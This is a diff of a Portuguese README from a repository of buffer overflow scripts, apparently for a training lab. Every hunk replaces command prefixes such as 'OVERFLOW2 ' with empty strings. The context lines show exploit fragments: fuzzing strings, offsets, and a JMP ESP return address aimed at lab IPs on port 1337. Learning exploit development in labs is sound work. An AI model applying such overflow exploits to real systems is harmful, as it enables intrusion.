@@ -34,7 +34,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
             
             port = 1337
             timeout = 5
-            prefix = "OVERFLOW2 " # Se trata do comando que é enviado ao servidor
+            prefix = "" # Se trata de algum comando que é enviado ao servidor
             qttChar = 50
             string = prefix + "A" * qttChar # String que será enviada para verificar quando o software quebra
             
@@ -84,7 +84,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
                 ip = "10.10.57.245"
                 port = 1337
                 
-                prefix = "OVERFLOW2 "# Se trata do comando que é enviado ao servidor
+                prefix = ""# Se trata de algum comando que é enviado ao servidor
                 offset = 0
                 overflow = "A" * offset
                 retn = ""
@@ -249,7 +249,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
             ip = "10.10.118.161"
             port = 1337
             
-            prefix = "OVERFLOW2 "
+            prefix = ""
             offset = 634
             overflow = "A" * offset
             retn = "\xaf\x11\x50\x62"
@@ -311,7 +311,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
             ip = "10.10.57.245"
             port = 1337
             
-            prefix = "OVERFLOW1 "
+            prefix = ""
             offset = 1978
             overflow = "A" * offset
             retn = "\xaf\x11\x50\x62"
@@ -374,7 +374,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
         
         port = 1337
         timeout = 5
-        prefix = "OVERFLOW2 " # Se trata do comando que é enviado ao servidor
+        prefix = "" # Se trata do comando que é enviado ao servidor
         qttChar = 50
         string = prefix + "A" * qttChar # String que será enviada para verificar quando o software quebra
         
@@ -406,7 +406,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
         ip = "10.10.22.151"
         port = 1337
         
-        prefix = "OVERFLOW2 "
+        prefix = ""
         offset = 0
         overflow = "A" * offset
         retn = ""
@@ -438,7 +438,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
             ip = "10.10.22.151"
             port = 1337
             
-            prefix = "OVERFLOW2 "
+            prefix = ""
             offset = 634 # Offset criado na etapa anterior
             overflow = "A" * offset
             retn = "BBBB" # Valor que será inserido em EIP -> É necessário que tenha algum valor qualquer 
@@ -469,7 +469,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
             ip = "10.10.22.151"
             port = 1337
             
-            prefix = "OVERFLOW2 "
+            prefix = ""
             offset = 634
             overflow = "A" * offset
             retn = "BBBB"
@@ -500,7 +500,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
         ip = "10.10.22.151"
         port = 1337
         
-        prefix = "OVERFLOW2 "
+        prefix = ""
         offset = 634
         overflow = "A" * offset
         retn = "\xaf\x11\x50\x62" # Endereço do JMP ESP inserido no código
@@ -536,7 +536,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
             ip = "10.10.22.151"
             port = 1337
             
-            prefix = "OVERFLOW2 "
+            prefix = ""
             offset = 634
             overflow = "A" * offset
             retn = "\xaf\x11\x50\x62"
@@ -590,7 +590,7 @@ Um respositório para compartilhar Scripts para Buffer OverFlow
         ip = "10.10.22.151"
         port = 1337
         
-        prefix = "OVERFLOW2 "
+        prefix = ""
         offset = 634
         overflow = "A" * offset
         retn = "\xaf\x11\x50\x62"
